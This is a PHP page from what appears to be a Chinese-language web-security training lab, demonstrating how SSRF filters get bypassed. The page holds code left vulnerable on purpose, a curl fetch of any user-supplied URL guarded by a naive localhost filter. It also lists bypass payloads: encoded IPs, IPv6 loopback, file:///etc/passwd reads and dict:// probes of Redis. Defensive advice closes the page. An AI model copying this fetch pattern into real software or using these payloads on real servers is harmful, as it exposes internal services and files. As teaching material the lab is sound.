<?php
// SSRF绕过限制
$module_name = 'SSRF绕过';
$module_icon = '🔓';
$module_desc = '演示SSRF常见的绕过限制方法，如IP限制、协议限制、URL格式限制等。';

// 漏洞代码
$result = '';
$error = '';

if (isset($_GET['bypass'])) {
    $bypass = $_GET['bypass'];
    
    // 模拟常见的SSRF限制
    $url = $bypass;
    
    // 漏洞：虽然有一些限制，但可以被绕过
    try {
        // 模拟IP限制（过滤127.0.0.1和localhost）
        if (strpos($url, '127.0.0.1') !== false || strpos($url, 'localhost') !== false) {
            $error = '访问被拒绝：禁止访问本地地址';
        } else {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            curl_setopt($ch, CURLOPT_TIMEOUT, 5);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
            curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
            curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            
            $response = curl_exec($ch);
            
            if (curl_errno($ch)) {
                $error = '请求失败：' . curl_error($ch);
            } else {
                $http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                if (strlen($response) > 500) {
                    $response = substr($response, 0, 500) . '...（截断）';
                }
                $result = '请求成功，HTTP状态码：' . $http_code . '\n\n响应内容：\n' . htmlspecialchars($response);
            }
            
            curl_close($ch);
        }
    } catch (Exception $e) {
        $error = '请求异常：' . $e->getMessage();
    }
}

// 页面内容
$content = '<div class="card">
        <div class="card-header">
            <h5 class="mb-0">🔓 SSRF绕过</h5>
        </div>
        <div class="card-body">
            <div class="alert alert-danger">
                <strong>💡 漏洞说明：</strong><br>
                本场景演示SSRF常见的绕过限制方法。<br>
                虽然服务器对SSRF进行了一些限制（如过滤本地地址），但攻击者可以通过各种方法绕过这些限制。
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🔍 漏洞代码</h6>
                </div>
                <div class="card-body">
                    <pre class="bg-dark text-light p-3 rounded"><code>if (isset($_GET["bypass"])) {
    $bypass = $_GET["bypass"];
    
    // 模拟常见的SSRF限制
    $url = $bypass;
    
    // 漏洞：虽然有一些限制，但可以被绕过
    if (strpos($url, "127.0.0.1") !== false || strpos($url, "localhost") !== false) {
        $error = "访问被拒绝：禁止访问本地地址";
    } else {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        
        $response = curl_exec($ch);
        
        curl_close($ch);
    }
}
</code></pre>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>🎯 攻击演示</h6>
                </div>
                <div class="card-body">
                    <p class="mb-3">本场景演示SSRF绕过限制的方法，尝试以下攻击：</p>

                    <h5 class="mb-2">1. 绕过IP限制</h5>
                    <ol>
                        <li>使用域名解析到本地地址：</li>
                        <ul>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=http://localhost</code> - 直接访问（会被拦截）</li>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=http://localhost.example.com</code> - 子域名欺骗</li>
                        </ul>
                        <li>使用IP地址编码：</li>
                        <ul>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=http://2130706433</code> - 十进制IP</li>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=http://0x7f000001</code> - 十六进制IP</li>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=http://0177.0000.0000.0001</code> - 八进制IP</li>
                        </ul>
                        <li>使用特殊地址：</li>
                        <ul>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=http://0</code> - 0.0.0.0（可能解析到本地）</li>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=http://[::1]</code> - IPv6本地地址</li>
                        </ul>
                    </ol>

                    <h5 class="mb-2 mt-4">2. 绕过协议限制</h5>
                    <ol>
                        <li>使用协议变体：</li>
                        <ul>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=HTTPS://www.example.com</code> - 大小写混淆</li>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=hTTp://www.example.com</code> - 大小写混合</li>
                        </ul>
                        <li>使用特殊协议：</li>
                        <ul>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=file:///etc/passwd</code> - 文件协议</li>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=dict://127.0.0.1:6379/info</code> - dict协议</li>
                        </ul>
                    </ol>

                    <h5 class="mb-2 mt-4">3. 绕过URL格式限制</h5>
                    <ol>
                        <li>使用URL编码：</li>
                        <ul>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=http%3A%2F%2F127.0.0.1</code> - URL编码</li>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=http%253A%252F%252F127.0.0.1</code> - 双重URL编码</li>
                        </ul>
                        <li>使用特殊字符：</li>
                        <ul>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=http://127.0.0.1:80#</code> - 锚点</li>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=http://127.0.0.1:80?</code> - 查询参数</li>
                            <li><code>http://localhost/zhaosec/ssrf/05_ssrf_bypass.php?bypass=http://127.0.0.1:80/</code> - 路径分隔符</li>
                        </ul>
                    </ol>

                    <h5 class="mb-2 mt-4">4. 其他绕过方法</h5>
                    <ol>
                        <li>使用DNS重绑定：</li>
                        <ul>
                            <li>配置一个DNS记录，先解析到合法域名，然后解析到本地地址</li>
                        </ul>
                        <li>使用代理服务：</li>
                        <ul>
                            <li>通过外部代理服务器访问内部资源</li>
                        </ul>
                        <li>使用CDN或其他服务：</li>
                        <ul>
                            <li>某些CDN或服务可能允许访问内部资源</li>
                        </ul>
                    </ol>
                </div>
            </div>

            <div class="card mb-3">
                <div class="card-header">
                    <h6>💻 实际测试</h6>
                </div>
                <div class="card-body">
                    <form method="GET" class="mb-3">
                        <div class="input-group">
                            <span class="input-group-text">绕过URL</span>
                            <input type="text" name="bypass" class="form-control" placeholder="例如：http://2130706433">
                            <button type="submit" class="btn btn-danger">测试</button>
                        </div>
                    </form>

                    ';

if ($error) {
    $content .= '<div class="alert alert-danger">
                        <strong>错误：</strong>
                        <p>' . htmlspecialchars($error) . '</p>
                    </div>';
}

if ($result) {
    $content .= '<div class="alert alert-secondary">
                        <strong>测试结果：</strong>
                        <pre class="mb-0 mt-2"><code>' . htmlspecialchars($result) . '</code></pre>
                    </div>';
}

$content .= '                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <h6>🛡️ 防御建议</h6>
                </div>
                <div class="card-body">
                    <ol>
                        <li><strong>使用白名单：</strong>只允许访问特定的域名或IP</li>
                        <li><strong>解析IP：</strong>将域名解析为IP后再检查，防止DNS重绑定</li>
                        <li><strong>全面过滤：</strong>过滤所有可能的本地地址表示形式</li>
                        <li><strong>协议限制：</strong>只允许http、https协议</li>
                        <li><strong>端口限制：</strong>只允许访问特定的端口</li>
                        <li><strong>使用代理：</strong>通过安全的代理服务器发起请求</li>
                        <li><strong>监控异常：</strong>监控异常的SSRF请求模式</li>
                        <li><strong>网络隔离：</strong>实施网络分段，限制服务器的网络访问范围</li>
                    </ol>
                </div>
            </div>
        </div>
    </div>';

// 包含模板
include '../template/module_template.php';
?>